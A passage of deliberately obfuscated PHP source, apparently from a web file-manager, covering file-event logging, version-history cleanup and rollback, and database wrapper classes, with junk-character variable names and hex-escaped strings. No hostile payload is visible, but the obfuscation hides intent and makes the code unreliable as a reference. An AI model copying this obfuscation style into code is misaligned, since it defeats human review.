$«—†³ã£); $†‡ÆÂÑ = array_merge($†‡ÆÂÑ, array_reverse($²ãâş¬š)); } $÷½Áíî = array_merge($÷½Áíî, $†‡ÆÂÑ); } $Îó‹“Õò[$Å¾šûÆâ] = array_unique($÷½Áíî); return $Îó‹“Õò[$Å¾šûÆâ]; } public function authTargetInfoMake($Œù£òİß) { $Ø¯ûöã’ =& $_SERVER[áäÒ½¯Ç]; $•±§¾ƒ° = array(); $Á÷¯ß = array(); foreach ($Œù£òİß as $³ä†«ı™) { if ($³ä†«ı™[$Ø¯ûöã’[189]] == SourceModel::TYPE_USER) { $•±§¾ƒ°[] = intval($³ä†«ı™[$Ø¯ûöã’[594]]); } else { if ($³ä†«ı™[$Ø¯ûöã’[189]] == SourceModel::TYPE_GROUP) { $Á÷¯ß[] = intval($³ä†«ı™[$Ø¯ûöã’[594]]); } } } if ($•±§¾ƒ°) { $•±§¾ƒ° = Model($Ø¯ûöã’[602])->userListInfo($•±§¾ƒ°); } if ($Á÷¯ß) { $Åí–É = array($Ø¯ûöã’[2218] => array($Ø¯ûöã’[512], $Á÷¯ß)); $Á÷¯ß = Model($Ø¯ûöã’[610])->field($Ø¯ûöã’[2357])->where($Åí–É)->select(); $Á÷¯ß = array_to_keyvalue($Á÷¯ß, $Ø¯ûöã’[1444]); } return array($Ø¯ûöã’[2358] => $•±§¾ƒ°, $Ø¯ûöã’[2359] => $Á÷¯ß); } public function authInfo($ª¤ÇÒ¦´) { $§µèìÛ =& $_SERVER[áäÒ½¯Ç]; if ($ª¤ÇÒ¦´[$§µèìÛ[1589]]) { $ÇíÁÆÊ¤ = Model($§µèìÛ[596])->listData($ª¤ÇÒ¦´[$§µèìÛ[1589]]); if (!$ÇíÁÆÊ¤) { return !1; $Õ­ìĞğ = Model($§µèìÛ[596])->listData(); $†¹¸´Îô = array_filter_by_field($Õ­ìĞğ, $§µèìÛ[507], $§µèìÛ[239]); return $†¹¸´Îô; } $Ùó˜êØ“ = array_field_key($ÇíÁÆÊ¤, array($§µèìÛ[492], $§µèìÛ[32], $§µèìÛ[507], $§µèìÛ[2154], $§µèìÛ[2155])); $Ùó˜êØ“[$§µèìÛ[2360]] = $ª¤ÇÒ¦´; return $Ùó˜êØ“; } else { return array($§µèìÛ[513] => 0, $§µèìÛ[2139] => $ª¤ÇÒ¦´[$§µèìÛ[2295]], $§µèìÛ[514] => $§µèìÛ[12], $§µèìÛ[2154] => $§µèìÛ[2361]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\x75\x72\x63\x65\137\x65\x76\145\x6e\x74"; protected $dataAuto = array(array("\143\162\145\x61\x74\x65\x54\x69\x6d\145", "\x74\x69\155\x65", "\x69\156\x73\145\162\x74", "\146\x75\156\x63\x74\151\x6f\156"), array("\x64\145\163\x63", '', "\x69\156\x73\145\x72\164\54\x75\160\x64\141\x74\x65\54\x73\145\x6c\x65\x63\164", "\152\x73\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($Ì˜»ğÈŸ, $®Ø—Ÿüí, $èëµŠ±ƒ = '') { $ªÙÉÕŞÀ =& $_SERVER[áäÒ½¯Ç]; if (!$this->eventSave) { return; } $©‘¶È¥™ = Model($ªÙÉÕŞÀ[1482])->sourceInfo($Ì˜»ğÈŸ); if (!$©‘¶È¥™) { return !1; } if ($this->isDisableEvent($©‘¶È¥™, $®Ø—Ÿüí)) { return; } if ($èëµŠ±ƒ && is_string($èëµŠ±ƒ)) { $èëµŠ±ƒ = array($ªÙÉÕŞÀ[2171] => $èëµŠ±ƒ); } $·è×²Œ = KodUser::id(); $áÔ€¾º« = array($ªÙÉÕŞÀ[511] => $Ì˜»ğÈŸ, $ªÙÉÕŞÀ[2362] => $©‘¶È¥™[$ªÙÉÕŞÀ[191]], $ªÙÉÕŞÀ[2363] => $©‘¶È¥™[$ªÙÉÕŞÀ[32]], $ªÙÉÕŞÀ[607] => !empty($©‘¶È¥™[$ªÙÉÕŞÀ[607]]) ? $©‘¶È¥™[$ªÙÉÕŞÀ[607]] : $ªÙÉÕŞÀ[12], $ªÙÉÕŞÀ[1918] => $·è×²Œ, $ªÙÉÕŞÀ[516] => $®Ø—Ÿüí, $ªÙÉÕŞÀ[1920] => $èëµŠ±ƒ); $this->addSystemLog($®Ø—Ÿüí, $áÔ€¾º«); unset($áÔ€¾º«[$ªÙÉÕŞÀ[2363]], $áÔ€¾º«[$ªÙÉÕŞÀ[607]]); return $this->add($áÔ€¾º«); } private function addSystemLog($¡ò“ÏÔĞ, $Õ±º¸Ç) { $­ª—ßşã =& $_SERVER[áäÒ½¯Ç]; if ($¡ò“ÏÔĞ == $­ª—ßşã[2364]) { $¡ò“ÏÔĞ = $Õ±º¸Ç[$­ª—ßşã[545]][$­ª—ßşã[2365]]; } else { if (in_array($¡ò“ÏÔĞ, array($­ª—ßşã[1512], $­ª—ßşã[2366]))) { $¡ò“ÏÔĞ = $Õ±º¸Ç[$­ª—ßşã[545]][$­ª—ßşã[169]]; } } $äÑ™ÙŞ‘ = array_merge($Õ±º¸Ç, array($­ª—ßşã[2367] => $Õ±º¸Ç[$­ª—ßşã[192]], $­ª—ßşã[2368] => $Õ±º¸Ç[$­ª—ßşã[2368]])); Hook::trigger($­ª—ßşã[2369], $­ª—ßşã[2370] . $¡ò“ÏÔĞ, $Õ±º¸Ç); Model($­ª—ßşã[2080])->addLog($­ª—ßşã[2370] . $¡ò“ÏÔĞ, $äÑ™ÙŞ‘); } private function isDisableEvent($°©š´„², $ÜÓ¾ã©¼) { $àÜ©èÀ• =& $_SERVER[áäÒ½¯Ç]; if ($°©š´„²[$àÜ©èÀ•[189]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($ÜÓ¾ã©¼ == $àÜ©èÀ•[1280]) { return !1; } return !0; } public function eventCreate($íÎÜÊú‰, $ç™îÌÁß) { $¤ÓõùÂ… =& $_SERVER[áäÒ½¯Ç]; $ğ±¡ñŞ = Model($¤ÓõùÂ…[1482])->sourceInfo($íÎÜÊú‰); $š‹ˆˆÂ = array($¤ÓõùÂ…[2365] => $ç™îÌÁß, $¤ÓõùÂ…[32] => $ğ±¡ñŞ[$¤ÓõùÂ…[32]]); return $this->addEvent($íÎÜÊú‰, $¤ÓõùÂ…[2364], $š‹ˆˆÂ); } public function eventFileEdit($ñ¶ŸÈ»†) { $·åÁñ¬È =& $_SERVER[áäÒ½¯Ç]; $¡¥Ÿ€Ü— = array($·åÁñ¬È[2371] => $_SERVER[$·åÁñ¬È[2372]], $·åÁñ¬È[2373] => strtolower(ACTION)); if (isset($GLOBALS[$·åÁñ¬È[7]][$·åÁñ¬È[1572]])) { $¡¥Ÿ€Ü—[$·åÁñ¬È[1572]] = $·åÁñ¬È[91]; } return $this->addEvent($ñ¶ŸÈ»†, $·åÁñ¬È[1511], $¡¥Ÿ€Ü—); } public function eventRecycle($¸Ò«–›, $”®ÑòØ») { return $this->addEvent($¸Ò«–›, $_SERVER[áäÒ½¯Ç][2366], $”®ÑòØ»); } private static $_removeLast = ''; public function eventRemove($ÂĞÙîÊÌ) { $Úï‘–èì =& $_SERVER[áäÒ½¯Ç]; self::$_removeLast = $ÂĞÙîÊÌ; $Î»–ã¼ë = Model($Úï‘–èì[1482])->sourceInfo($ÂĞÙîÊÌ); $ÃÛ¡Õ«Ù = array_field_key($Î»–ã¼ë, array($Úï‘–èì[192], $Úï‘–èì[562], $Úï‘–èì[525], $Úï‘–èì[609])); $¨ø¦Íª§ = array($Úï‘–èì[169] => $Î»–ã¼ë[$Úï‘–èì[32]], $Úï‘–èì[2373] => ACTION, $Úï‘–èì[2374] => $ÃÛ¡Õ«Ù); return $this->addEvent($Î»–ã¼ë[$Úï‘–èì[191]], $Úï‘–èì[1280], $¨ø¦Íª§); } public function eventShare($ôÌ¡¡£…, $Ï­â¨é) { return $this->addEvent($ôÌ¡¡£…, $_SERVER[áäÒ½¯Ç][1512], $Ï­â¨é); } public function eventMove($úù³ ¼, $Ùí¿Ÿ¬À, $ÑÒª±Ÿò) { $ÀŞÇ½±Ú =& $_SERVER[áäÒ½¯Ç]; if (self::$_removeLast == $úù³ ¼) { return; } $‰ä§Ë = Model($ÀŞÇ½±Ú[1482]); $ôƒŠ = $‰ä§Ë->sourceInfo($úù³ ¼); $±‚¬Ñ´ü = $‰ä§Ë->sourceInfo($Ùí¿Ÿ¬À); $³Œ¹î× = $‰ä§Ë->sourceInfo($ÑÒª±Ÿò); $üØ›·Á = array($ÀŞÇ½±Ú[1292] => $Ùí¿Ÿ¬À, $ÀŞÇ½±Ú[2375] => $±‚¬Ñ´ü[$ÀŞÇ½±Ú[32]], $ÀŞÇ½±Ú[2333] => !empty($±‚¬Ñ´ü[$ÀŞÇ½±Ú[607]]) ? $±‚¬Ñ´ü[$ÀŞÇ½±Ú[607]] : $ÀŞÇ½±Ú[12], $ÀŞÇ½±Ú[1293] => $ÑÒª±Ÿò, $ÀŞÇ½±Ú[2376] => $³Œ¹î×[$ÀŞÇ½±Ú[32]], $ÀŞÇ½±Ú[2377] => !empty($³Œ¹î×[$ÀŞÇ½±Ú[607]]) ? $³Œ¹î×[$ÀŞÇ½±Ú[607]] : $ÀŞÇ½±Ú[12]); $this->addEvent($úù³ ¼, $ÀŞÇ½±Ú[648], $üØ›·Á); $ôƒŠ = $‰ä§Ë->sourceInfo($úù³ ¼); $üØ›·Á = array($ÀŞÇ½±Ú[192] => $ôƒŠ[$ÀŞÇ½±Ú[192]], $ÀŞÇ½±Ú[32] => $ôƒŠ[$ÀŞÇ½±Ú[32]]); $this->addEvent($Ùí¿Ÿ¬À, $ÀŞÇ½±Ú[2378], $üØ›·Á); } public function eventCopy($´®²ÔŒó) { $this->eventCreate($´®²ÔŒó, $_SERVER[áäÒ½¯Ç][646]); } public function eventRename($ƒà¥Æ•À, $êø¿ËÆÇ, $ùòÌãü) { $ÚŠ¡İ©¿ =& $_SERVER[áäÒ½¯Ç]; $…”¨ĞµÚ = array($ÚŠ¡İ©¿[1292] => $êø¿ËÆÇ, $ÚŠ¡İ©¿[1293] => $ùòÌãü); return $this->addEvent($ƒà¥Æ•À, $ÚŠ¡İ©¿[1496], $…”¨ĞµÚ); } public function eventAddComment($ÒàûÙŞ, $ã«é°¦Á) { return $this->addEvent($ÒàûÙŞ, $_SERVER[áäÒ½¯Ç][2379], $ã«é°¦Á); } public function eventAddDesc($åŸµ³˜, $•¥ùßØ) { return $this->addEvent($åŸµ³˜, $_SERVER[áäÒ½¯Ç][2380], $•¥ùßØ); } public function listBySource($°”Ä¹´¯) { $¼²ÕÀÂá =& $_SERVER[áäÒ½¯Ç]; $¯Á¨ê¨á = Model($¼²ÕÀÂá[1482])->sourceInfo($°”Ä¹´¯); $Ë Ø†’ñ = array($¼²ÕÀÂá[511] => $°”Ä¹´¯); if ($¯Á¨ê¨á[$¼²ÕÀÂá[505]] == $¼²ÕÀÂá[91]) { $ï­á‘˜ = Model($¼²ÕÀÂá[1482])->listSearchChildren($°”Ä¹´¯, 20000); $ï­á‘˜[] = $°”Ä¹´¯ . $¼²ÕÀÂá[472]; $Ë Ø†’ñ = array($¼²ÕÀÂá[192] => array($¼²ÕÀÂá[7], $ï­á‘˜)); } $ñ“Ùö›¶ = $this->where($Ë Ø†’ñ)->order($¼²ÕÀÂá[2381])->selectPage(); if ($ñ“Ùö›¶[$¼²ÕÀÂá[452]][$¼²ÕÀÂá[453]] == 0) { $ñ“Ùö›¶[$¼²ÕÀÂá[452]][$¼²ÕÀÂá[453]] = 1; $ñ“Ùö›¶[$¼²ÕÀÂá[455]] = array(array($¼²ÕÀÂá[511] => $°”Ä¹´¯, $¼²ÕÀÂá[2362] => $¯Á¨ê¨á[$¼²ÕÀÂá[191]], $¼²ÕÀÂá[1918] => $¯Á¨ê¨á[$¼²ÕÀÂá[546]], $¼²ÕÀÂá[516] => $¼²ÕÀÂá[2382], $¼²ÕÀÂá[517] => $¯Á¨ê¨á[$¼²ÕÀÂá[242]], $¼²ÕÀÂá[1920] => $¼²ÕÀÂá[12])); } return $this->eventListParse($ñ“Ùö›¶, $°”Ä¹´¯); } private function eventListParse($ÆØ¡ˆÌÄ, $Î¨Òüº) { $ì˜õ› =& $_SERVER[áäÒ½¯Ç]; $š°ß´‡÷ = $ÆØ¡ˆÌÄ[$ì˜õ›[455]]; $ïúİÚ‚ = array_to_keyvalue($š°ß´‡÷, $ì˜õ›[12], $ì˜õ›[192]); $¯íğÇğ¨ = array_to_keyvalue($š°ß´‡÷, $ì˜õ›[12], $ì˜õ›[2368]); foreach ($š°ß´‡÷ as $ÀÁâİµ“) { $Åî‹Ù§Ñ = $ÀÁâİµ“[$ì˜õ›[545]]; if ($ÀÁâİµ“[$ì˜õ›[33]] == $ì˜õ›[648] && isset($Åî‹Ù§Ñ[$ì˜õ›[1292]])) { $ïúİÚ‚[] = $Åî‹Ù§Ñ[$ì˜õ›[1292]] . $ì˜õ›[12]; $ïúİÚ‚[] = $Åî‹Ù§Ñ[$ì˜õ›[1293]] . $ì˜õ›[12]; } if ($ÀÁâİµ“[$ì˜õ›[33]] == $ì˜õ›[2378] && isset($Åî‹Ù§Ñ[$ì˜õ›[192]])) { $ïúİÚ‚[] = $Åî‹Ù§Ñ[$ì˜õ›[192]] . $ì˜õ›[12]; } } $ïúİÚ‚ = array_merge($ïúİÚ‚, $¯íğÇğ¨, array($Î¨Òüº . $ì˜õ›[12])); $ïúİÚ‚ = array_unique($ïúİÚ‚); $¤™ÜÜÌÊ = array_unique(array_to_keyvalue($š°ß´‡÷, $ì˜õ›[12], $ì˜õ›[1542])); $™÷ÁÄçÔ = Model($ì˜õ›[622])->userListInfo($¤™ÜÜÌÊ); $ÍÒ®®ò = Model($ì˜õ›[935])->sourceListInfo($ïúİÚ‚, !0); foreach ($š°ß´‡÷ as &$ÀÁâİµ“) { if ($ÀÁâİµ“[$ì˜õ›[33]] == $ì˜õ›[648] && isset($ÀÁâİµ“[$ì˜õ›[545]][$ì˜õ›[1292]])) { $ÀÁâİµ“[$ì˜õ›[545]][$ì˜õ›[1292]] = $ÍÒ®®ò[$ÀÁâİµ“[$ì˜õ›[545]][$ì˜õ›[1292]]]; $ÀÁâİµ“[$ì˜õ›[545]][$ì˜õ›[1293]] = $ÍÒ®®ò[$ÀÁâİµ“[$ì˜õ›[545]][$ì˜õ›[1293]]]; } if ($ÀÁâİµ“[$ì˜õ›[33]] == $ì˜õ›[2378] && isset($ÀÁâİµ“[$ì˜õ›[545]][$ì˜õ›[192]])) { $ÀÁâİµ“[$ì˜õ›[545]][$ì˜õ›[192]] = $ÍÒ®®ò[$ÀÁâİµ“[$ì˜õ›[545]][$ì˜õ›[192]]]; } $ÀÁâİµ“[$ì˜õ›[90]] = $ÍÒ®®ò[$ÀÁâİµ“[$ì˜õ›[192]]]; $ÀÁâİµ“[$ì˜õ›[2383]] = $ÍÒ®®ò[$ÀÁâİµ“[$ì˜õ›[2368]]]; if ($ÀÁâİµ“[$ì˜õ›[33]] == $ì˜õ›[1280]) { $ÀÁâİµ“[$ì˜õ›[2383]] = $ÀÁâİµ“[$ì˜õ›[90]]; $ÀÁâİµ“[$ì˜õ›[2368]] = $ÀÁâİµ“[$ì˜õ›[2383]][$ì˜õ›[192]]; $ÀÁâİµ“[$ì˜õ›[90]] = !1; $ÀÁâİµ“[$ì˜õ›[192]] = $ì˜õ›[12]; } $ÀÁâİµ“[$ì˜õ›[2307]] = $™÷ÁÄçÔ[$ÀÁâİµ“[$ì˜õ›[1542]]]; } unset($ÀÁâİµ“); $ÆØ¡ˆÌÄ[$ì˜õ›[455]] = $š°ß´‡÷; return $ÆØ¡ˆÌÄ; } public function removeBySource($°Â•Ê­ß) { $¸Çºá = array($_SERVER[áäÒ½¯Ç][511] => $°Â•Ê­ß); $this->where($¸Çºá)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\165\x72\143\145\x5f\x68\x69\x73\164\157\162\171"; public function historyCount($ğ±óÏÆä) { $óàºš =& $_SERVER[áäÒ½¯Ç]; if (!$ğ±óÏÆä) { return array(); } if (is_string($ğ±óÏÆä) || is_int($ğ±óÏÆä)) { $ğ±óÏÆä = array($ğ±óÏÆä); } $œ…’º = array($óàºš[192], $óàºš[2384] => $óàºš[590]); $Ì‘Ùçˆ« = array($óàºš[192] => array($óàºš[7], $ğ±óÏÆä)); $”ÊÅ¥¨º = $this->field($œ…’º)->where($Ì‘Ùçˆ«)->group($óàºš[192])->select(); return array_to_keyvalue($”ÊÅ¥¨º, $óàºš[192], $óàºš[590]); } public function addHistory($ğÂõİ¹À, $œ Ûñ–Ä = '') { $‹‘»—­š =& $_SERVER[áäÒ½¯Ç]; $¡”ÔØ°˜ = array($‹‘»—­š[511] => $ğÂõİ¹À[$‹‘»—­š[192]], $‹‘»—­š[1918] => isset($ğÂõİ¹À[$‹‘»—­š[548]]) ? $ğÂõİ¹À[$‹‘»—­š[548]] : $ğÂõİ¹À[$‹‘»—­š[546]], $‹‘»—­š[563] => $ğÂõİ¹À[$‹‘»—­š[562]], $‹‘»—­š[645] => $ğÂõİ¹À[$‹‘»—­š[79]], $‹‘»—­š[2385] => $œ Ûñ–Ä); if ($GLOBALS[$‹‘»—­š[6]][$‹‘»—­š[92]][$‹‘»—­š[1354]] >= 1) { $this->historyAutoClear($¡”ÔØ°˜[$‹‘»—­š[192]]); $this->add($¡”ÔØ°˜); } Hook::trigger($‹‘»—­š[2386], $¡”ÔØ°˜); Model($‹‘»—­š[2387])->eventFileEdit($ğÂõİ¹À[$‹‘»—­š[192]]); } private function historyAutoClear($¸¡ú»Ù) { $­„º®ñ‚ =& $_SERVER[áäÒ½¯Ç]; $Õ“Œ ãŸ = Model($­„º®ñ‚[875])->get($­„º®ñ‚[1376]); $Ñ’ú—¢» = intval($GLOBALS[$­„º®ñ‚[6]][$­„º®ñ‚[92]][$­„º®ñ‚[1354]]); $¸¿ú¾ÂÙ = $Õ“Œ ãŸ == $­„º®ñ‚[1377] ? min(5, $Ñ’ú—¢») : $Ñ’ú—¢»; $¸¿ú¾ÂÙ = $¸¿ú¾ÂÙ <= 0 ? 0 : $¸¿ú¾ÂÙ - 1; if ($¸¿ú¾ÂÙ >= 499) { return; } $Ü±£°¤ = array($­„º®ñ‚[511] => $¸¡ú»Ù); $£¦¡õÇÊ = $this->field($­„º®ñ‚[2388])->where($Ü±£°¤)->order($­„º®ñ‚[2381])->select(); if (!$£¦¡õÇÊ || $¸¿ú¾ÂÙ >= count($£¦¡õÇÊ)) { return; } $•ä„Ä½î = array_to_keyvalue($£¦¡õÇÊ, $­„º®ñ‚[12], $­„º®ñ‚[492]); $•ä„Ä½î = array_slice($•ä„Ä½î, $¸¿ú¾ÂÙ); $©ş¢çÀ„ = array_to_keyvalue($£¦¡õÇÊ, $­„º®ñ‚[12], $­„º®ñ‚[562]); $©ş¢çÀ„ = array_slice($©ş¢çÀ„, $¸¿ú¾ÂÙ); if (!$•ä„Ä½î || !$©ş¢çÀ„) { return; } $Ü±£°¤ = array($­„º®ñ‚[513] => array($­„º®ñ‚[7], $•ä„Ä½î)); $this->where($Ü±£°¤)->delete(); Model($­„º®ñ‚[565])->remove($©ş¢çÀ„); } public function listData($âÁÏã) { $öğÄ½ü =& $_SERVER[áäÒ½¯Ç]; $ªøç”… = array($öğÄ½ü[511] => $âÁÏã); $é Íªµñ = $öğÄ½ü[2389]; $şÚïø¨— = $this->field($é Íªµñ)->where($ªøç”…)->order($öğÄ½ü[2381])->selectPage(); $this->_listAppendUser($şÚïø¨—[$öğÄ½ü[455]]); $³æ¿ÜÓÕ = Model($öğÄ½ü[875])->get($öğÄ½ü[1376]); $‡ ôÎê» = 5; if ($³æ¿ÜÓÕ == $öğÄ½ü[1377]) { $şÚïø¨—[$öğÄ½ü[455]] = array_slice($şÚïø¨—[$öğÄ½ü[455]], 0, $‡ ôÎê»); $şÚïø¨—[$öğÄ½ü[452]] = array($öğÄ½ü[2390] => 1, $öğÄ½ü[2391] => 20, $öğÄ½ü[2392] => 1, $öğÄ½ü[2393] => count($şÚïø¨—[$öğÄ½ü[455]])); } return $şÚïø¨—; } protected function _listAppendUser(&$š×˜ó¥ç) { $ä§æ¼¤ =& $_SERVER[áäÒ½¯Ç]; $¹•²´É– = array_to_keyvalue($š×˜ó¥ç, $ä§æ¼¤[12], $ä§æ¼¤[1542]); $µ„é€è = Model($ä§æ¼¤[622])->userListInfo($¹•²´É–); foreach ($š×˜ó¥ç as &$»ô¡ãŠú) { $ıÄÑèšà = $»ô¡ãŠú[$ä§æ¼¤[1542]]; $»ô¡ãŠú[$ä§æ¼¤[546]] = $µ„é€è[$ıÄÑèšà] ? $µ„é€è[$ıÄÑèšà] : !1; } unset($»ô¡ãŠú); } public function fileInfo($±¦ÓğÏ˜, $÷ºÛÜÃ» = false) { $™¿Ààª® =& $_SERVER[áäÒ½¯Ç]; $Ù”Ä¬Ğ™ = $this->tablePrefix; $Ã¸™Ÿº¨ = "{$Ù”Ä¬Ğ™}\151\x6f\x5f\146\151\154\x65\x20\x66\151\154\x65\x73\40\157\156\x20\146\x69\x6c\x65\163\56\146\x69\154\x65\x49\x44\40\75\40\150\x69\x73\164\x6f\162\171\56\x66\151\154\145\x49\104"; $çæ¼µçñ = $this->alias($™¿Ààª®[2394])->where(array($™¿Ààª®[513] => $±¦ÓğÏ˜))->join($Ã¸™Ÿº¨, $™¿Ààª®[2395])->find(); if ($çæ¼µçñ && $÷ºÛÜÃ») { $»˜ª¿Ãª = array($™¿Ààª®[192] => $çæ¼µçñ[$™¿Ààª®[192]], $™¿Ààª®[492] => array($™¿Ààª®[1129], $±¦ÓğÏ˜)); $çæ¼µçñ[$™¿Ààª®[1814]] = $this->where($»˜ª¿Ãª)->count(); } return $çæ¼µçñ; } public function removeItem($¾ÉÑ¯å‘) { $Ã—€£èá =& $_SERVER[áäÒ½¯Ç]; $´’¿Ó›Ñ = array($Ã—€£èá[513] => $¾ÉÑ¯å‘); $ô˜ÀËÀå = $this->where($´’¿Ó›Ñ)->find(); if ($ô˜ÀËÀå) { $ç£—­Á” = $this->where($´’¿Ó›Ñ)->delete(); Model($Ã—€£èá[565])->remove($ô˜ÀËÀå[$Ã—€£èá[562]]); return $ç£—­Á”; } return !1; } public function removeBySource($ùÁÄ€§) { $£èÒí›± =& $_SERVER[áäÒ½¯Ç]; if (!$ùÁÄ€§) { return !1; } if (!is_array($ùÁÄ€§)) { $ùÁÄ€§ = array($ùÁÄ€§); } $›ö€¨¹Ä = array($£èÒí›±[511] => array($£èÒí›±[7], $ùÁÄ€§)); $®æ„Ëö = $this->field($£èÒí›±[563])->where($›ö€¨¹Ä)->select(); if ($®æ„Ëö) { $this->where($›ö€¨¹Ä)->delete(); $ÖÈÉˆ” = array_to_keyvalue($®æ„Ëö, $£èÒí›±[12], $£èÒí›±[562]); Model($£èÒí›±[565])->remove($ÖÈÉˆ”); } return !0; } public function setDetail($ØŞôŒéŸ, $Î ¹äßš) { $ƒÂÉè‰è =& $_SERVER[áäÒ½¯Ç]; return $this->where(array($ƒÂÉè‰è[513] => $ØŞôŒéŸ))->save(array($ƒÂÉè‰è[2385] => $Î ¹äßš)); } public function rollbackToItem($ÓÚì××, $¿òÇ«ÔÚ) { $âãÆÃ½Š =& $_SERVER[áäÒ½¯Ç]; $­‹›êë® = Model($âãÆÃ½Š[935])->sourceInfo($ÓÚì××); $this->addHistory($­‹›êë®, LNG($âãÆÃ½Š[2396])); $›—ß®û÷ = $this->find($¿òÇ«ÔÚ); $ÈÜ¦ÒÒ = array($âãÆÃ½Š[562] => $›—ß®û÷[$âãÆÃ½Š[562]], $âãÆÃ½Š[79] => $›—ß®û÷[$âãÆÃ½Š[79]], $âãÆÃ½Š[88] => time(), $âãÆÃ½Š[548] => USER_ID); Model($âãÆÃ½Š[935])->where(array($âãÆÃ½Š[192] => $ÓÚì××))->save($ÈÜ¦ÒÒ); return $this->where(array($âãÆÃ½Š[513] => $¿òÇ«ÔÚ))->delete(); } public function clearSame($Ò¾¹ùÆ) { $Î»¸ú·· =& $_SERVER[áäÒ½¯Ç]; $°êÚˆ˜¶ = $this->listData($Ò¾¹ùÆ); $ÚÔ€òçí = array_to_keyvalue_group($°êÚˆ˜¶, $Î»¸ú··[562]); $È¿É¹Š£ = array(); $É¤Ã‚ò† = array(); foreach ($ÚÔ€òçí as $ ¯‰¡­Ô) { if (!$ ¯‰¡­Ô || count($ ¯‰¡­Ô) <= 1) { continue; } foreach ($ ¯‰¡­Ô as $™Å·§³ø) { $È¿É¹Š£[] = $™Å·§³ø[$Î»¸ú··[562]]; $É¤Ã‚ò†[] = $™Å·§³ø[$Î»¸ú··[492]]; } } if (!$É¤Ã‚ò†) { return; } $this->where(array($Î»¸ú··[492] => array($Î»¸ú··[7], $É¤Ã‚ò†)))->delete(); Model($Î»¸ú··[565])->remove($È¿É¹Š£); } public function userSpace() { $˜¸ê¯Áã =& $_SERVER[áäÒ½¯Ç]; $ìÂïùã = $this->tablePrefix; $¿†°Š•Ì = array($˜¸ê¯Áã[1918] => USER_ID); $ŸåüÛœã = "{$ìÂïùã}\151\x6f\137\x66\151\154\145\40\146\x69\x6c\145\163\40\157\x6e\40\146\x69\x6c\145\x73\x2e\146\151\154\x65\x49\x44\40\x3d\x20\x68\151\x73\164\x6f\162\x79\x2e\x66\151\x6c\x65\111\104"; return $this->alias($˜¸ê¯Áã[2394])->where($¿†°Š•Ì)->join($ŸåüÛœã, $˜¸ê¯Áã[2395])->sum($˜¸ê¯Áã[79]); } } goto Aƒ÷´ä·»ê; C¢¸êÆ‰ÆÁ: class DbSqlite3 extends DbSqlite3Base { public function query($Æ–ÏÈ) { $µÀæÕ¶û =& $_SERVER[áäÒ½¯Ç]; if (!CacheLock::fileLock($µÀæÕ¶û[13])) { return !1; } $Ş«Üµ×­ = parent::query($Æ–ÏÈ); CacheLock::fileUnLock($µÀæÕ¶û[13]); return $Ş«Üµ×­; } public function execute($øØ†ƒ—Ë) { $™ÎÈÛÂ§ =& $_SERVER[áäÒ½¯Ç]; if (!CacheLock::fileLock($™ÎÈÛÂ§[13])) { return !1; } $†ÇİÃ© = parent::execute($øØ†ƒ—Ë); CacheLock::fileUnLock($™ÎÈÛÂ§[13]); return $†ÇİÃ©; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\151\156\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\75", "\x6e\x65\161" => "\74\76", "\x67\x74" => "\76", "\x65\x67\164" => "\x3e\75", "\x6c\164" => "\x3c", "\145\x6c\x74" => "\74\75", "\156\157\164\154\x69\x6b\x65" => "\116\x4f\124\x20\x4c\x49\113\105", "\x6c\x69\153\145" => "\114\111\113\105", "\x69\x6e" => "\x49\116", "\x6e\x6f\x74\151\x6e" => "\116\x4f\x54\40\x49\x4e", "\156\x6f\164\40\151\156" => "\116\x4f\x54\x20\x49\116", "\x62\x65\x74\x77\145\145\156" => "\x42\x45\x54\x57\105\105\x4e", "\156\157\x74\142\x65\x74\167\145\x65\x6e" => "\116\x4f\124\x20\102\105\124\127\x45\x45\x4e", "\156\157\164\x20\142\x65\x74\167\145\145\x6e" => "\x4e\117\124\x20\x42\x45\124\x57\105\x45\116"); protected $selectSql = "\123\x45\x4c\x45\103\x54\x25\104\x49\x53\x54\x49\116\x43\x54\45\40\45\x46\x49\105\x4c\x44\45\x20\106\122\x4f\115\40\45\124\x41\x42\x4c\x45\x25\45\x4a\117\x49\116\x25\x25\x57\x48\x45\x52\105\x25\45\107\x52\117\x55\120\x25\45\x48\101\126\x49\x4e\107\x25\x25\117\x52\x44\105\x52\x25\x25\114\x49\115\111\x54\x25\x20\45\125\x4e\x49\x4f\116\45\x25\103\117\x4d\115\x45\116\x54\x25"; protected $bind = array(); public static function getInstance() { $’İÂÓ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[áäÒ½¯Ç][1076], $’İÂÓ); } public function factory($ĞÀ¬Ü›¦ = '') { $¹¨™¼¬à =& $_SERVER[áäÒ½¯Ç]; $ĞÀ¬Ü›¦ = $this->parseConfig($ĞÀ¬Ü›¦); if (empty($ĞÀ¬Ü›¦[$¹¨™¼¬à[1077]])) { think_exception(think_lang($¹¨™¼¬à[1078])); } $this->dbType = ucwords(strtolower($ĞÀ¬Ü›¦[$¹¨™¼¬à[1077]])); $Ùßû©° = $¹¨™¼¬à[1079] . $this->dbType; if (class_exists($Ùßû©°)) { $æ­Ò”“‹ = new $Ùßû©°($ĞÀ¬Ü›¦); if ($¹¨™¼¬à[1080] != strtolower($ĞÀ¬Ü›¦[$¹¨™¼¬à[1077]])) { $æ­Ò”“‹->dbType = strtoupper($this->dbType); } else { $æ­Ò”“‹->dbType = $this->_getDsnType($ĞÀ¬Ü›¦[$¹¨™¼¬à[1032]]); } } else { think_exception(think_lang($¹¨™¼¬à[1081]) . $¹¨™¼¬à[1082] . $Ùßû©°); } return $æ­Ò”“‹; } public function __call($úª‹é”ã, $ÖıŠãÒó) { if (method_exists($this, $úª‹é”ã)) { return call_user_func_array(array($this, $úª‹é”ã), $ÖıŠãÒó); } } protected function _getDsnType($˜½¸ù“Ë) { $õúù«‹ = explode($_SERVER[áäÒ½¯Ç][4], $˜½¸ù“Ë); $¾ò¬‰¸Û = strtoupper(trim($õúù«‹[0])); return $¾ò¬‰¸Û; } private function 